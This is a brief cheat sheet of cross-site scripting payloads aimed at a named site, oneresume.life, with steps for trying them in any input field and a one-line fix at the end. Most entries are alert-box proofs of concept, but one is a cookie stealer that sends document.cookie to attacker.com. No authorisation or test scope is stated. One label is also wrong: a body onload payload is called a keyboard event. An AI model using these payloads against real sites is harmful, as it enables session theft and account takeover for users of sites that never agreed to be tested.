XSS Test Payloads for oneresume.life

Try these in any input field on the target site:

1. Basic Alert (Proof of Concept)

<script>alert('XSS')</script>

If you see an alert box, XSS is confirmed.

2. Cookie Stealer (Impact Demo)

<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

Would send user's cookies to attacker server.

3. Image Tag (Bypass basic filters)

<img src=x onerror=alert('XSS')>

Works even if <script> tags are blocked.

4. SVG Payload

<svg onload=alert('XSS')>

Alternative vector for modern browsers.

5. Event Handler

<input onfocus=alert('XSS') autofocus>

Triggers when input gets focus.

6. Keyboard Event

<body onload=alert('XSS')>

Triggers on page load.

How to Test:

  1. Find any input field (search, forms, URL parameters)
  2. Enter the payload
  3. If alert pops up = XSS confirmed
  4. Document the vulnerable parameter

Fix: Add Content-Security-Policy header + sanitize all inputs
